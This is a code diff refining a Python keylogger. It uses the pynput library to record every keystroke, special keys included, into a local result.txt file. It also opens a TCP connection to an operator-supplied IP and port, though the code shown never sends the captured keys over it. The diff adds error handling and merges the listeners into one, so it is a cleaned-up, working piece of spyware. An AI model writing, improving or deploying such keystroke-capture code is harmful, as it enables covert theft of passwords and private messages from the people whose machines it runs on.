@@ -1,42 +1,50 @@
 import pynput
-from pynput.keyboard import Controller, Listener, Key
 from pynput import keyboard
+import socket
 import time
 import json
-import socket
 
 TCP_IP = input("Enter your TCP IP: ")
-TCP_PORT = input("Enter your TCP Port: ")
+TCP_PORT = int(input("Enter your TCP Port: "))  # Ensure port is an integer
 BUFFER_SIZE = 1024
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((TCP_IP, TCP_PORT))
 
-class MyException(Exception): pass
+# Socket connection setup
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((TCP_IP, TCP_PORT))
+except socket.error as e:
+    print(f"Socket error: {e}")
+    exit(1)
 
 def on_press(key):
-    if key == keyboard.Key.esc:
-        raise MyException(key)
-
-def key_monitor(key):
     try:
+        # Log the key press to a file
         with open("result.txt", "a") as f:
-            f.write(key.char)
+            f.write(f'{key.char}')
     except AttributeError:
-        pass
+        # Handle special keys
+        with open("result.txt", "a") as f:
+            f.write(f'{key}')
+    except Exception as e:
+        print(f"Error: {e}")
 
+    # Exit on 'Esc' key press
+    if key == keyboard.Key.esc:
+        return False
 
-def typing(key):
-    print('{0} released'.format(
-        key))
+def on_release(key):
+    print(f'{key} released')
     if key == keyboard.Key.esc:
         # Stop listener
         return False
 
-with keyboard.Listener(on_press=on_press) as listener:
-    try:
-        with keyboard.Listener(on_press=key_monitor, on_release=typing) as listener2:
-            listener2.join()
-    except MyException as e:
-        print('{0} was pressed'.format(e.args[0]))
+# Setup listener for key press and release
+try:
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+except Exception as e:
+    print(f"Listener error: {e}")
+finally:
+    # Ensure socket is closed properly
+    s.close()
 
-s.close()
